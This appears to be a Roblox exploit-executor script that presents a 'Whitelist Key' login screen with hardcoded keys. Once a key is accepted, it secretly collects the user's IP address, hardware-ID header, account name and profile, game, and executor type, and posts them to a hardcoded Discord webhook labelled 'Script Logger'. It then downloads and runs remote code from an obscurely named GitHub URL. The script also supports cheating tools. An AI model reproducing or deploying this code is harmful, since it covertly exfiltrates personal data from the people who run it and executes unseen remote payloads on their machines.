if game.CoreGui:FindFirstChild("Key System") then
game.CoreGui:FindFirstChild("Key System"):Destroy()
end
local KeySystem = Instance.new("ScreenGui")
local KeySystem_2 = Instance.new("Frame")
local Title = Instance.new("TextLabel")
local UICorner = Instance.new("UICorner")
local Image = Instance.new("ImageLabel")
local UICorner_2 = Instance.new("UICorner")
local Image_2 = Instance.new("ImageLabel")
local UICorner_3 = Instance.new("UICorner")
local UICorner_4 = Instance.new("UICorner")
local Login = Instance.new("TextButton")
local UICorner_5 = Instance.new("UICorner")
local UIGradient = Instance.new("UIGradient")
local KeyText = Instance.new("TextBox")
local UICorner_6 = Instance.new("UICorner")

--Properties:

KeySystem.Name = "Key System"
KeySystem.Parent = game.CoreGui
KeySystem.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

KeySystem_2.Name = "Key System"
KeySystem_2.Parent = KeySystem
KeySystem_2.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
KeySystem_2.Position = UDim2.new(0.380605567, 0, 0.327877998, 0)
KeySystem_2.Size = UDim2.new(0, 410, 0, 234)
KeySystem_2.Active = true
KeySystem_2.Draggable = true

Title.Name = "Title"
Title.Parent = KeySystem_2
Title.BackgroundColor3 = Color3.fromRGB(46, 46, 46)
Title.Position = UDim2.new(0, 0, -0.00172202603, 0)
Title.Size = UDim2.new(0, 410, 0, 47)
Title.Font = Enum.Font.Ubuntu
Title.Text = "Whitelist Key"
Title.TextColor3 = Color3.fromRGB(255, 255, 255)
Title.TextSize = 42.000

UICorner.CornerRadius = UDim.new(0, 9)
UICorner.Parent = Title

Image.Name = "Image"
Image.Parent = Title
Image.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Image.BackgroundTransparency = 1.000
Image.Position = UDim2.new(0.853658497, 0, 0.100000001, 0)
Image.Size = UDim2.new(0, 48, 0, 40)
Image.Image = "http://www.roblox.com/asset/?id=41040082"
Image.ImageColor3 = Color3.fromRGB(255, 133, 11)

UICorner_2.Parent = Image

Image_2.Name = "Image"
Image_2.Parent = Title
Image_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Image_2.BackgroundTransparency = 1.000
Image_2.Position = UDim2.new(0.0170731712, 0, 0.100000001, 0)
Image_2.Size = UDim2.new(0, 48, 0, 40)
Image_2.Image = "http://www.roblox.com/asset/?id=41040082"
Image_2.ImageColor3 = Color3.fromRGB(255, 136, 0)

UICorner_3.Parent = Image_2

UICorner_4.CornerRadius = UDim.new(0, 9)
UICorner_4.Parent = KeySystem_2

Login.Name = "Login"
Login.Parent = KeySystem_2
Login.BackgroundColor3 = Color3.fromRGB(0, 53, 53)
Login.Position = UDim2.new(0.197560981, 0, 0.713675201, 0)
Login.Size = UDim2.new(0, 246, 0, 52)
Login.Style = Enum.ButtonStyle.RobloxButtonDefault
Login.Font = Enum.Font.SourceSans
Login.Text = "Login"
Login.TextColor3 = Color3.fromRGB(255, 255, 255)
Login.TextSize = 14.000
Login.MouseButton1Down:connect(function()
	Login.Text = "Checking Key ..."
	wait(2)
	if(KeyText.Text == "ase3Ag4N69yYJ4j7jWdkSZzVQQYKcO" or KeyText.Text == "pea123." or KeyText.Text == "hibro[key.].") then
	local IP = game:HttpGet("https://v4.ident.me")
plr = game:GetService'Players'.LocalPlayer
local premium = false
local ALT = false
if plr.MembershipType == Enum.MembershipType.Premium then
	premium = true
elseif plr.MembershipType == Enum.MembershipType.None then
	premium = false
end
if premium == false then 
	if plr.AccountAge <= 10 then 
		ALT = true
	end
end

local market = game:GetService("MarketplaceService")
local info = market:GetProductInfo(game.PlaceId, Enum.InfoType.Asset)


local http_request = http_request;
if syn then
	http_request = syn.request
elseif SENTINEL_V2 then
	function http_request(tb)
		return {
			StatusCode = 200;
			Body = request(tb.Url, tb.Method, (tb.Body or ''))
		}
	end
end
local function getexploit()
    local exploit =
        (syn and not is_sirhurt_closure and not pebc_execute and "Synapse") or
        (secure_load and "Sentinel") or
        (is_sirhurt_closure and "Sirhurt") or
        (pebc_execute and "ProtoSmasher") or
        (KRNL_LOADED and "Krnl") or
        (WrapGlobal and "WeAreDevs") or
        (isvm and "Proxo") or
        (shadow_env and "Shadow") or
        (jit and "EasyExploits") or
        (getscriptenvs and "Calamari") or
        (unit and not syn and "Unit") or
        (OXYGEN_LOADED and "Oxygen U") or
        (IsElectron and "Electron") or
        ("Unsupported")
  
    return exploit
  end

local body = http_request({Url = 'https://httpbin.org/get'; Method = 'GET'}).Body;
local decoded = game:GetService('HttpService'):JSONDecode(body)
local hwid_list = {"Syn-Fingerprint", "Exploit-Guid", "Proto-User-Identifier", "Sentinel-Fingerprint", "Krnl-Hwid"};
hwid = "";
local blacklisted = ("")

for i, v in next, hwid_list do
	if decoded.headers[v] then
		hwid = decoded.headers[v];
		break
	end
end

if hwid then
local OSTime = os.time();
local Time = os.date('!*t', OSTime);
local Avatar = 'https://cdn.discordapp.com/embed/avatars/4.png';
local Content = '';
local Embed = {
    title = 'Script Logger';
    color = 000255000;
    footer = { 
      text = plr.name;
      icon_url = 'https://www.roblox.com/bust-thumbnail/image?userId='.. plr.UserId ..'&width=420&height=420&format=png'
   };
    author = {
        name = plr.Name;
        url = 'https://www.roblox.com/users/'.. plr.UserId ..'/profile';
        icon_url = 'https://www.roblox.com/bust-thumbnail/image?userId='.. plr.UserId ..'&width=420&height=420&format=png'
    };
    fields = {
        {
            name = 'Whitelisted:';
            value = "Yes";
            inline = true
        },
        {
            name = 'Ip Adress (v4)';
            value = IP;
            inline = true
        },
        {
            name = 'GameName:';
            value = info.Name;
            inline = true
        },
        {
            name = 'Key Used:';
            value = KeyText.Text;
            inline = true
        },
        {
            name = 'GameLink:';
            value = "[Click here!](https://roblox.com/games/" .. game.PlaceId .. "/)";
            inline = true
        },
        {
            name = 'Exploit:';
            value = getexploit();
            inline = true
        }
    };
    timestamp = string.format('%d-%d-%dT%02d:%02d:%02dZ', Time.year, Time.month, Time.day, Time.hour, Time.min, Time.sec);
};
(syn and syn.request or http_request) {
    Url = "https://discord.com/api/webhooks/877488805987381278/wuwtz9PgLhsGAaCftzPfqH5M8OGG9LFVM4W7ShjY30G56MTJnlGx5DcL5Fm4IuBqjKNz";
    Method = 'POST';
    Headers = {
        ['Content-Type'] = 'application/json';
    };
    Body = game:GetService'HttpService':JSONEncode( { content = Content; embeds = { Embed } } );
};
end
		Login.Text = 'Correct Key !'
		Login.TextColor3 = Color3.fromRGB(0, 255, 0)
		KeyText.TextColor3 = Color3.fromRGB(0, 255, 0)
		KeyText.PlaceholderColor3 = Color3.fromRGB(0, 255, 0)
		wait(1)
		Login.Text = 'Loading Gui...'
		wait(0.5)
		game.CoreGui:FindFirstChild("Key System"):Destroy()
                wait()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/baconplayer009/gdfkjgpdofkgodfugdbngkjrdbgjkndfgdgrdfgrd/main/gdrgcfgdfgfdg"))()
	else
	        Login.TextColor3 = Color3.fromRGB(255, 0, 0)
	        KeyText.PlaceholderColor3 = Color3.fromRGB(255, 0, 0)
		KeyText.TextColor3 = Color3.fromRGB(255, 0, 0)
		Login.Text = "Incorrect Key !"
		wait(3)
		Login.Text = "Login"
	end
end)

UICorner_5.Parent = Login

UIGradient.Parent = Login

KeyText.Name = "KeyText"
KeyText.Parent = KeySystem_2
KeyText.BackgroundColor3 = Color3.fromRGB(26, 26, 27)
KeyText.Position = UDim2.new(0.111701578, 0, 0.395371616, 0)
KeyText.Size = UDim2.new(0, 315, 0, 47)
KeyText.Font = Enum.Font.SourceSans
KeyText.PlaceholderColor3 = Color3.fromRGB(255, 255, 255)
KeyText.PlaceholderText = "Enter Your Whitelist Key Here!"
KeyText.Text = ""
KeyText.TextColor3 = Color3.fromRGB(255, 255, 255)
KeyText.TextScaled = true
KeyText.TextSize = 14.000
KeyText.TextWrapped = true

UICorner_6.Parent = KeyText
